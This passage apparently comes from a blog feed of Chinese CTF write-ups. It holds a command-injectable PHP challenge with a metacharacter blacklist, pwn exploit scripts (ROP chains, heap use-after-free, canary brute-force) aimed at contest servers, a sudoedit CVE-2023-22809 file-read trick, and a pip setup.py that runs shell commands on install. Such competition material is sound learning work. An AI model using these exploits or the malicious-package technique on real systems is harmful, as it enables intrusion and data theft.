class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black</span> = <span class="hljs-string">&#x27;;`*#^$&amp;|&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$black</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$black</span>[<span class="hljs-variable">$i</span>])===<span class="hljs-literal">FALSE</span>))&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;host&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;-h&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;dbname=ctf&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>&#125;<br><span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1&#x27;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$db</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no db!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2q</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from <span class="hljs-subst">$db</span>.<span class="hljs-subst">$t2q</span>&quot;</span>;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2q</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-variable">$stm</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$stm</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$res</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2d</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2d</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$randstr</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>());<br>    <span class="hljs-variable">$dump</span>=<span class="hljs-string">&#x27;mariadb-dump &#x27;</span>.<span class="hljs-variable">$db</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$t2d</span>.<span class="hljs-string">&#x27; &gt;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$dump</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;dump log here: &lt;a href=\&#x27;&#x27;</span>.<span class="hljs-string">&#x27;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>.<span class="hljs-string">&#x27;\&#x27;&gt;here&lt;/a&gt;&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="pwn">pwn</h1><h2 id="烧烤摊儿">烧烤摊儿</h2><p>修改名称存在栈溢出，程序不存在<code>system</code>函数，使用<code>orw</code>获取<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ppwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./shaokao&#x27;)</span><br>p=Remote(<span class="hljs-string">&quot;123.56.251.120 12585&quot;</span>)<br>e=ELF(<span class="hljs-string">&quot;./shaokao&quot;</span>)<br><br>fopen=e.sym[<span class="hljs-string">&#x27;open64&#x27;</span>]<br>read=e.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write=e.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401fae&#x27;)</span><br>rdi=<span class="hljs-number">0x000000000040264f</span> <span class="hljs-comment">#rdi</span><br>rsi=<span class="hljs-number">0x000000000040a67e</span> <span class="hljs-comment">#rsi</span><br>rdx=<span class="hljs-number">0x00000000004a404b</span> <span class="hljs-comment">#rdx rbx</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-100000&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(rdi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(fopen)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(read)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(write)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="StrangeTalkBot">StrangeTalkBot</h2><p>程序使用了<code>protobuf</code>协议解析输入数据，构造<code>protobuf</code>数据，传入即可<br>程序中存在<code>uaf</code>漏洞与数组越界漏洞，利用<code>gadget</code>构造栈迁移，实现<code>orw</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> varint<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Mode</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span>+varint.encode(m&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Ind</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+varint.encode(i&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Size</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x18&#x27;</span>+varint.encode(s&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Data</span>(<span class="hljs-params">d</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x22&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(d))+d<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">b&#x27; &#x27;</span></span>):<br>    payload=Mode(<span class="hljs-number">1</span>)+Ind(ind)+Size(size)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    payload=Mode(<span class="hljs-number">2</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">3</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">4</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">1</span>:<br>    p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>    gdb.attach(p)<br><span class="hljs-keyword">else</span>:<br>    p=remote(<span class="hljs-string">&quot;123.56.244.196&quot;</span>,<span class="hljs-string">&quot;35492&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i,<span class="hljs-number">0xe8</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br>show(<span class="hljs-number">1</span>)<br>heap=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br>show(<span class="hljs-number">2</span>)<br>heap1=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap1))<br><br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">8</span>)<br><br>show(<span class="hljs-number">8</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-<span class="hljs-number">0x1eccc0</span><br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x154dea</span><br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>rdi=<span class="hljs-number">0x0000000000023b6a</span>+libc.address<br>rsi=<span class="hljs-number">0x000000000002601f</span>+libc.address<br>rdx=<span class="hljs-number">0x0000000000142c92</span>+libc.address<br>leave=libc.address+<span class="hljs-number">0x00000000000578c8</span><br>edit(<span class="hljs-number">6</span>,p64(free_hook))<br><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xe8</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span><br><br>edit(<span class="hljs-number">0</span>,flat([heap+<span class="hljs-number">0x48</span>,leave,<br>    heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    heap,<span class="hljs-number">0</span>,<br>    leave,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    heap,<br>    rdi,heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    rsi,<span class="hljs-number">0x1000</span>,<br>    rdx,<span class="hljs-number">7</span>,<br>    mprotect,<br>    heap1]))<br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)+shellcraft.write(<span class="hljs-number">1</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)<br>edit(<span class="hljs-number">1</span>,asm(shellcode))<br><br>add(<span class="hljs-number">0x11</span>,<span class="hljs-number">0xe8</span>)<br>add(<span class="hljs-number">0x12</span>,<span class="hljs-number">0xe8</span>,p64(gadget))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gadget))<br><br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="funcanary">funcanary</h2><p>程序使用了<code>fork</code>，所以在子进程中报错，不会使程序中断，所以爆破<code>canary</code>，然后跳转到后门位置就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>backdoor=<span class="hljs-number">0x1229</span><br><br><span class="hljs-comment">#p=process(&quot;./funcanary&quot;)</span><br>p=remote(<span class="hljs-string">&quot;123.56.135.185&quot;</span>,<span class="hljs-string">&quot;32640&quot;</span>)<br><br>canary=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>        p.sendafter(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+p8(j))<br>        data=p.readline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;stack&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-built_in">print</span>(j)<br>            canary+=p8(j)<br>            <span class="hljs-keyword">break</span><br>i=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">0x10</span>:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>        data=p.readuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>        f.write(data)<br>        p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p16(<span class="hljs-number">0xffff</span>&amp;(<span class="hljs-number">0x1200</span>+j+i*<span class="hljs-number">0x1000</span>)))<br>        pause()<br>    i+=<span class="hljs-number">1</span><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Shell-We-Go">Shell We Go</h2><p>当认证结束之后，执行<code>echo</code>指令，存在栈溢出，使用<code>+</code>可以跳过栈空间，直接覆盖返回值<br>构造<code>rop</code>，执行<code>orw</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;47.93.187.243&quot;</span>,<span class="hljs-string">&quot;38686&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;cert nAcDsMicN  S33UAga1n@#!&quot;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>cmd=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">bp 0x4c181a</span><br><span class="hljs-string">bp 0x4c18a0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makepayload</span>(<span class="hljs-params">data</span>):<br>    e=<span class="hljs-string">b&#x27;&#x27;</span><br>    i=<span class="hljs-number">0</span><br>    step=<span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(data):<br>        e+=data[i:i+step]+<span class="hljs-string">b&#x27; &#x27;</span><br>        i+=step<br>    <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;echo &#x27;</span>+e<br><br>rdi=<span class="hljs-number">0x0000000000444fec</span><br>system=<span class="hljs-number">0x43e7e6</span><br>rsi=<span class="hljs-number">0x000000000041e818</span><br>rdx=<span class="hljs-number">0x000000000049e11d</span><br>sh=<span class="hljs-number">0x4c38e7</span><br>rax=<span class="hljs-number">0x000000000040d9e6</span><br>flag=<span class="hljs-number">0x4c34c8</span><br>syscall=<span class="hljs-number">0x000000000040328c</span><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>bss=e.bss()<br><br>payload=<span class="hljs-string">b&#x27;+&#x27;</span>*(<span class="hljs-number">0x298</span>-<span class="hljs-number">0x78</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">3</span>+p64(rdi)+p64(flag)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rdx)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">1</span>)+p64(syscall)<br><br>p.sendline(makepayload(payload))<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="reverse">reverse</h1><h2 id="babyRE">babyRE</h2><p><a href="https://snap.berkeley.edu/">https://snap.berkeley.edu/</a> 导入xml</p><p>导出密文后异或得到flag</p><p><img src="/img/blog_img/CISCN/page_Image/85d183a7af058ab01508f6d4778e0578829cff0fbe8d5bd70a375b91d73ecccc.png" srcset="/img/loading.gif" lazyload alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">102</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">28</span>,<span class="hljs-number">74</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">85</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">75</span>,<span class="hljs-number">20</span>,<span class="hljs-number">92</span>,<span class="hljs-number">92</span>,<span class="hljs-number">8</span>,<span class="hljs-number">28</span>,<span class="hljs-number">25</span>,<span class="hljs-number">81</span>,<span class="hljs-number">83</span>,<span class="hljs-number">7</span>,<span class="hljs-number">28</span>,<span class="hljs-number">76</span>,<span class="hljs-number">88</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">29</span>,<span class="hljs-number">73</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">4</span>,<span class="hljs-number">87</span>,<span class="hljs-number">87</span>,<span class="hljs-number">82</span>,<span class="hljs-number">84</span>,<span class="hljs-number">85</span>,<span class="hljs-number">4</span>,<span class="hljs-number">85</span>,<span class="hljs-number">87</span>,<span class="hljs-number">30</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(a)):<br>    a[i]=a[i]^a[i-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023春秋杯春季赛</title>
    <link href="/page/wp/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B/"/>
    <url>/page/wp/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="MISC">MISC</h2><h3 id="sudo">sudo</h3><p><a href="https://blog.csdn.net/weixin_52763014/article/details/130027297">CVE-2023-22809</a><br>连接靶机执行<code>sudo -V</code>,发现版本为<code>1.8.21p2</code>符合文章中说的版本<br>查看<code>/etc/sudoers</code>发现当前文件可以无密码执行<code>sudoedit /etc/GAMELAB</code>,这也符合文章中的条件<br>文章中执行了一条<code>EDITOR=&quot;vim -- /path/to/extra/file&quot; sudoedit /etc/GAMELAB</code>，用来编辑文件<br>那么我们改一下<code>EDITOR=&quot;cat -- /flag&quot; sudoedit /etc/GAMELAB</code>就可以读取<code>/flag</code>文件获得<code>flag</code></p><h3 id="piphack">piphack</h3><p>编写<code>setup.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>a=os.popen(<span class="hljs-string">&quot;cat /flag&quot;</span>).read()<br><span class="hljs-keyword">raise</span> Exception(a)<br><br><span class="hljs-comment"># git+https://github.com/xxx/xx.git</span><br></code></pre></td></tr></table></figure><p>在<code>github</code>中创建仓库，上传<code>setup.py</code>，然后连接靶机输入<code>git+https://github.com/xxx/xx.git</code>，靶机就会自动下载仓库中的文件，并执行<code>setup.py</code>,只要靶机将仓库下载下来，<code>flag</code>就会在出现报错信息中</p><h3 id="wordle">wordle</h3><p>连接靶机之后先随便输入几个五个字母的单词，然后将存在错误的字母的单词排除，将正确的字母在正确的位置的单词保留，之后就可以得到正确的单词</p><h3 